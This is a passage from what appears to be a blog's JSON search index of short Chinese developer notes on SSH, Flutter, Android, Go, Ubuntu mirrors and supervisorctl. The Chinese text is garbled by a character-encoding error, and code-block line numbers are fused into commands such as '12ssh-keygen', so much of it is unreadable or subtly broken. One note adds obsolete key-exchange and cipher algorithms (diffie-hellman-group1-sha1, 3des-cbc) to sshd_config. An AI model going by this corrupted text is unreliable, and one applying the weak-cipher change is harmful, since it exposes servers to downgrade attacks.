é™¤æ³¨å†Œè¡¨é”®å€¼ï¼›","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"navicat è¿æ¥é˜¿é‡Œäº‘mysql 80070007","slug":"history/tech/5c3f44c0b77f63ce2b1a9ed3","date":"2019-01-16T02:50:40.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c3f44c0b77f63ce2b1a9ed3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c3f44c0b77f63ce2b1a9ed3/","excerpt":"","text":"æŠ¥é”™ï¼š180070007: SSH Tunnel: Server does not support diffie-hellman-group1-sha1 for keyexchangeè§£å†³ï¼švim /etc/ssh/sshd_config åœ¨æœ€ä¸‹é¢ åŠ å…¥ä¸‹é¢ä»£ç ï¼š12KexAlgorithms diffie-hellman-group1-sha1,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1Ciphers 3des-cbc,blowfish-cbc,aes128-cbc,aes128-ctr,aes256-ctræ‰§è¡Œï¼š12ssh-keygen -Aservice ssh restart","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"golang ä½¿ç”¨ç§æœ‰ä»“åº“(go get https è½¬ ssh)","slug":"history/tech/5c3f2372b77f63ce2b1a9ed2","date":"2019-01-16T00:28:34.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c3f2372b77f63ce2b1a9ed2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c3f2372b77f63ce2b1a9ed2/","excerpt":"","text":"é’ˆå¯¹ gitlab go get https è½¬ ssh:123vim ~/.gitconfig[url &quot;git@gitlab.mygitlab.com:&quot;] insteadOf = https://gitlab.mygitlab.comæˆ–ç›´æ¥ä½¿ç”¨å‘½ä»¤ï¼š1git config --global url.&quot;git@gitlab.mygitlab.com:&quot;.insteadOf &quot;https://gitlab.mygitlab.com&quot;1dep ensure ......","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"flutter MacOS å¼€å‘ç¯å¢ƒæ­å»º","slug":"history/tech/5c3eebb3b77f63ce2b1a9ed1","date":"2019-01-15T20:30:43.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c3eebb3b77f63ce2b1a9ed1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c3eebb3b77f63ce2b1a9ed1/","excerpt":"","text":"1234561.ä¸‹è½½å®‰è£…åŒ…https://flutter.io/docs/get-started/install/macos2.mkdir ~/development &amp;&amp; cd ~/development å°†ä¸‹è½½å®‰è£…åŒ…ç§»åŠ¨åˆ°è¿™ä¸ªç›®å½• mv ä¸‹è½½çš„æ–‡ä»¶å¤¹ /flutter.**.zip ~/development3.è®¾ç½®ç¯å¢ƒå˜é‡ export PATH=$PATH:`pwd`/flutter/bin4.æ‰§è¡Œæ£€æŸ¥ flutter doctor æŸ¥çœ‹ç»“æœ~~ğŸ‘‡12345678910111213141516171819202122232425262728293031323334*******:development ******$ flutter doctorDoctor summary (to see all details, run flutter doctor -v):[âœ“] Flutter (Channel stable, v1.0.0, on Mac OS X 10.14.2 18C54, locale zh-Hans-CN)[âœ—] Android toolchain - develop for Android devices âœ— Unable to locate Android SDK. Install Android Studio from: https://developer.android.com/studio/index.html On first launch it will assist you in installing the Android SDK components. (or visit https://flutter.io/setup/#android-setup for detailed instructions). If Android SDK has been installed to a custom location, set $ANDROID_HOME to that location. You may also want to add it to your PATH environment variable.[!] iOS toolchain - develop for iOS devices (Xcode 10.1) âœ— libimobiledevice and ideviceinstaller are not installed. To install with Brew, run: brew update brew install --HEAD usbmuxd brew link usbmuxd brew install --HEAD libimobiledevice brew install ideviceinstaller âœ— ios-deploy not installed. To install with Brew: brew install ios-deploy âœ— CocoaPods not installed. CocoaPods is used to retrieve the iOS platform side&apos;s plugin code that responds to your plugin usage on the Dart side. Without resolving iOS dependencies with CocoaPods, plugins will not work on iOS. For more info, see https://flutter.io/platform-plugins To install: brew install cocoapods pod setup[!] Android Studio (not installed)[!] IntelliJ IDEA Ultimate Edition (version 2018.1.3) âœ— Flutter plugin not installed; this adds Flutter specific functionality. âœ— Dart plugin not installed; this adds Dart specific functionality.[!] VS Code (version 1.30.2)[!] Connected device ! No devices available1234567891011127.å‘ç°æ²¡æœ‰å®‰è£…Android SDK å®‰è£…ï¼Œso !! å®‰è£…å®ƒ åœ°å€ï¼šhttp://www.android-studio.org/ æ‰¾åˆ° android-studio-ide-*****-mac.dmg ä¸‹è½½å®‰è£…å®ƒã€‚å®‰è£…å®Œæ‰§è¡Œ flutter doctor --android-licenses OK æå®šã€‚ã€‚æ‰§è¡Œå‰©ä¸‹çš„å‘½ä»¤ã€‚æ²¡æœ‰å®‰è£…brew å…ˆå®‰è£…å®ƒ æœ‰ç›´æ¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤~ brew install --HEAD usbmuxd brew link usbmuxd brew install --HEAD libimobiledevice brew install ideviceinstaller brew install ios-deploy brew install cocoapods pod setup","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"Spark submit job is submitted","slug":"history/tech/5c234321be437f5805a40dea","date":"2018-12-25T21:00:17.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c234321be437f5805a40dea/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c234321be437f5805a40dea/","excerpt":"","text":"123Spark submit job is submitted æ²¡æœ‰å¯ç”¨çš„workeræä¾›å·¥ä½œå¯¼è‡´ï¼Œjob æŒ‚èµ·æœªè¿è¡Œè§£å†³åŠæ³•ï¼šæ£€æŸ¥sparké›†ç¾¤æ˜¯å¦ç»„é˜ŸæˆåŠŸ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"Warning:android-apt plugin is incompatible","slug":"history/tech/5c20e61abe437f5805a40de9","date":"2018-12-24T01:58:50.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c20e61abe437f5805a40de9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c20e61abe437f5805a40de9/","excerpt":"","text":"build.gradle ä¸­ åˆ é™¤ä»¥ä¸‹å†…å®¹:1apply plugin: &apos;com.neenbedankt.android-apt&apos;æŠŠ buildscript çš„ dependencies ä¸­åˆ æ‰:1classpath &apos;com.neenbedankt.gradle.plugins:android-apt:1.8&apos;æ›¿æ¢ dependencies ä¸­çš„ apt:1apt &apos;com.google.dagger:dagger-compiler:2.0.2&apos;æ›¿æ¢ä¸º:1annotationProcessor &apos;com.google.dagger:dagger-compiler:2.0.2&apos;æ›¿æ¢ jacocoClasspath:1jacocoClasspath = configurations[&apos;androidJacocoAnt&apos;]æ›¿æ¢ä¸º1jacocoClasspath = configurations[&apos;jacocoAnt&apos;]","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"adb å–å‡º æ‰‹æœºä¸­çš„ apk","slug":"history/tech/5c20e4e1be437f5805a40de8","date":"2018-12-24T01:53:37.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c20e4e1be437f5805a40de8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c20e4e1be437f5805a40de8/","excerpt":"","text":"123adb shell pm list packages | grep jazzbeeradb shell pm path com.jazzbeer.accumetronomeadb pull data/app/com.jazzbeer.accumetronome-1/base.apk base.apk","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"flutter å¡ package get","slug":"history/tech/5c1f21fabe437f5805a40de7","date":"2018-12-22T17:49:46.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c1f21fabe437f5805a40de7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c1f21fabe437f5805a40de7/","excerpt":"","text":"12export PUB_HOSTED_URL=https://pub.flutter-io.cnexport FLUTTER_STORAGE_BASE_URL=https://storage.flutter-io.cn","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"flutter Waiting for another flutter command to release the startup lock","slug":"history/tech/5c1f21d6be437f5805a40de6","date":"2018-12-22T17:49:10.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c1f21d6be437f5805a40de6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c1f21d6be437f5805a40de6/","excerpt":"","text":"1rm -rf flutter/bin/cache/lockfile","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"android studio å¡  Initializing gradle","slug":"history/tech/5c1e05e4be437f5805a40de5","date":"2018-12-21T21:37:40.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c1e05e4be437f5805a40de5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c1e05e4be437f5805a40de5/","excerpt":"","text":"æŸ¥æ‰¾æ–‡ä»¶ï¼š1&apos;flutter\\packages\\flutter_tools\\gradle\\flutter.gradle&apos;ä¿®æ”¹é…ç½®ï¼š1234567repositories &#123; maven &#123; url &apos;https://maven.aliyun.com/repository/google&apos; &#125; maven &#123; url &apos;https://maven.aliyun.com/repository/jcenter&apos; &#125; maven &#123; url &apos;http://maven.aliyun.com/nexus/content/groups/public/&apos; &#125; // google() jcenter()&#123; url &apos;http://jcenter.bintray.com/&apos;&#125;&#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"android gradle å¡æ­»","slug":"history/tech/5c1dcd7abe437f5805a40de4","date":"2018-12-21T17:36:58.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c1dcd7abe437f5805a40de4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c1dcd7abe437f5805a40de4/","excerpt":"","text":"android studio å¡ Initializing gradlesdk ä¸­ æŸ¥æ‰¾æ–‡ä»¶ï¼šâ€˜flutter\\packages\\flutter_tools\\gradle\\flutter.gradleâ€™ä¿®æ”¹é…ç½®ï¼š1234567repositories &#123; maven &#123; url &apos;https://maven.aliyun.com/repository/google&apos; &#125; maven &#123; url &apos;https://maven.aliyun.com/repository/jcenter&apos; &#125; maven &#123; url &apos;http://maven.aliyun.com/nexus/content/groups/public/&apos; &#125; // google() jcenter()&#123; url &apos;http://jcenter.bintray.com/&apos;&#125;&#125; gradle å¡æ­»é¡¹ç›®ä¸­æ‰“å¼€æ–‡ä»¶æŸ¥æ‰¾ç‰ˆæœ¬ï¼švim hello_world\\android\\gradle\\wrapper\\gradle-wrapper1distributionUrl=https\\://services.gradle.org/distributions/gradle-4.10.2-all.zipä¸‹è½½åœ°å€ï¼š1https://gradle.org/releases/å°† zip åŒ…æ”¾åˆ°ç”¨æˆ·ä¸»ç›®å½• .gradle\\wrapper\\dists\\gradle-4.10.2-all\\9fahxiiecdb76a5g3aw9oi8rv\\ ä¸‹ google_m2repository_gms_v11_3_rc05_wear_2_0_5.zipgoogle_m2repository_gms_v11_3_rc05_wear_2_0_5.zip è§£å‹ç¼©åˆ° sdkpath/extras/google/m2repository","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos git ç¼–è¯‘å®‰è£…","slug":"history/tech/5c19b09bbe437f5805a40de1","date":"2018-12-19T02:44:43.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c19b09bbe437f5805a40de1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c19b09bbe437f5805a40de1/","excerpt":"","text":"ä¸‹è½½ï¼š1wget https://codeload.github.com/git/git/zip/masterå®‰è£…ç¯å¢ƒï¼š12345678yum install -y unzipyum install -y zlib-develyum install -y autoconfyum install -y curl-develyum install -y asciidocyum install -y xmltoyum install -y docbook2Xln -s /usr/bin/db2x_docbook2texi /usr/bin/docbook2x-texiç¼–è¯‘å®‰è£…ï¼š1234autoconf -i./configuremake prefix=/usr all doc infomake prefix=/usr install install-doc install-html install-info","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"flutter Checkbox tristate","slug":"history/tech/5c1a3d72be437f5805a40de3","date":"2018-12-19T00:45:38.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c1a3d72be437f5805a40de3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c1a3d72be437f5805a40de3/","excerpt":"","text":"trueï¼šé€‰ä¸­çŠ¶æ€ã€‚falseï¼šä¸é€‰ä¸­çŠ¶æ€ã€‚nullï¼šåªæœ‰åœ¨ tristate=true æ—¶å¯è®¾ç½®æ­¤å€¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos æ™®é€šç”¨æˆ·æ— æ³•ç™»å½•","slug":"history/tech/5c19d6b4be437f5805a40de2","date":"2018-12-18T17:27:16.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c19d6b4be437f5805a40de2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c19d6b4be437f5805a40de2/","excerpt":"","text":"æ‰“å¼€æ–‡ä»¶ï¼š1vim /etc/security/access.confæ·»åŠ ï¼š1-:ALL EXCEPT root &lt;username&gt;:ALLç”Ÿæ•ˆï¼š1source /etc/security/access.confå‚è€ƒèµ„æ–™ï¼šhttps://www.ibm.com/developerworks/cn/aix/library/au-sshlocks/index.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu zlib å®‰è£…","slug":"history/tech/5c185d26be437f5805a40ddf","date":"2018-12-18T02:36:22.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c185d26be437f5805a40ddf/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c185d26be437f5805a40ddf/","excerpt":"","text":"1sudo apt-get install zlib1g-dev","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"win10 å®‰è£… tensorflow-gpu","slug":"history/tech/5c189a70be437f5805a40de0","date":"2018-12-17T18:57:52.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c189a70be437f5805a40de0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c189a70be437f5805a40de0/","excerpt":"","text":"CUDA:https://developer.nvidia.com/cuda-90-download-archiveCUDNN:https://developer.nvidia.com/rdp/cudnn-archivetensorflow:1pip install tensorflow-gpu --upgradeæµ‹è¯•ï¼š1234567891011import tensorflow as tfa = tf.test.is_built_with_cuda() # åˆ¤æ–­CUDAæ˜¯å¦å¯ä»¥ç”¨b = tf.test.is_gpu_available( cuda_only=False, min_cuda_compute_capability=None) # åˆ¤æ–­GPUæ˜¯å¦å¯ä»¥ç”¨print(a)print(b)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ubuntu 18.04 æº","slug":"history/tech/5c1746bebe437f5805a40dde","date":"2018-12-16T18:48:30.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c1746bebe437f5805a40dde/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c1746bebe437f5805a40dde/","excerpt":"","text":"ä¸­ç§‘å¤§æº12345678910deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse é˜¿é‡Œæº12345678910deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 163æº12345678910deb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse æ¸…åæº12345678910deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiversedeb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"flutter å‘½ä»¤","slug":"history/tech/5c137a9fbe437f5805a40ddd","date":"2018-12-13T21:40:47.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c137a9fbe437f5805a40ddd/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c137a9fbe437f5805a40ddd/","excerpt":"","text":"å‡çº§ flutter sdk å¹¶ åŒæ—¶æ›´æ–°Flutter SDKå’Œä½ çš„flutteré¡¹ç›®ä¾èµ–åŒ…:1flutter upgradeæ›´æ–°é¡¹ç›®ä¾èµ–åŒ…ï¼š12flutter packages get è·å–é¡¹ç›®æ‰€æœ‰çš„ä¾èµ–åŒ…flutter packages upgrade è·å–é¡¹ç›®æ‰€æœ‰ä¾èµ–åŒ…çš„æœ€æ–°ç‰ˆæœ¬","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windows ä¸‹ å®‰å“å¯åŠ¨æ¨¡æ‹Ÿå™¨æŠ¥é”™","slug":"history/tech/5c120f40be437f5805a40ddc","date":"2018-12-12T19:50:24.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c120f40be437f5805a40ddc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c120f40be437f5805a40ddc/","excerpt":"","text":"æŠ¥é”™ï¼š1Emulator: CPU acceleration status: Unable to open HAXM device: ERROR_FILE_NOT_FOUNDæŸ¥è¯¢ï¼š1234567891011121314C:\\WINDOWS\\system32&gt;sc query intelhaxmSERVICE_NAME: intelhaxm TYPE : 1 KERNEL_DRIVER STATE : 1 STOPPED WIN32_EXIT_CODE : 2 (0x2) SERVICE_EXIT_CODE : 0 (0x0) CHECKPOINT : 0x0 WAIT_HINT : 0x0C:\\WINDOWS\\system32&gt;sc start intelhaxm[SC] StartService å¤±è´¥ 2:ç³»ç»Ÿæ‰¾ä¸åˆ°æŒ‡å®šçš„æ–‡ä»¶ã€‚è§£å†³ï¼šé¦–å…ˆä¿è¯å·²ç»å…³é—­ Hyper-vè¿›å…¥ C:\\Users\\%USERNAME%\\AppData\\Local\\Android\\Sdk\\extras\\intel\\Hardware_Accelerated_Execution_Managerå¸è½½é‡è£… intelhaxm-android","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"supervisorctl å¸¸ç”¨å‘½ä»¤","slug":"history/tech/5c11f8a2be437f5805a40ddb","date":"2018-12-12T18:13:54.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c11f8a2be437f5805a40ddb/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c11f8a2be437f5805a40ddb/","excerpt":"","text":"å¢åŠ é…ç½®åæ›´æ–°å¹¶å¯åŠ¨æœåŠ¡ï¼š1supervisorctl updateæ¢æµ‹æ–°å¢åŠ çš„æœåŠ¡ï¼š1supervisorctl rereadå¯åŠ¨/é‡å¯/åœæ­¢ï¼š123supervisorctl start &lt;program_name&gt;supervisorctl restart &lt;program_name&gt;supervisorctl stop &lt;program_name&gt;å…¨éƒ¨é‡å¯ï¼š1supervisorctl reloadèµ„æ–™ï¼šhttp://supervisord.org/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windows ä¸‹ jdk ç¯å¢ƒå˜é‡","slug":"history/tech/5c111c84be437f5805a40dda","date":"2018-12-12T02:34:44.000Z","updated":"2020-11-29T01:42:08.775Z","comments":true,"path":"history/tech/5c111c84be437f5805a40dda/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5c111c84be437f5805a40dda/","excerpt":"","text":"ç³»ç»Ÿå˜é‡/æ–°å»º JAVA_HOME å˜é‡ç³»ç»Ÿå˜é‡/Path: %JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;ç³»ç»Ÿå˜é‡/CLASSPATH å˜é‡: 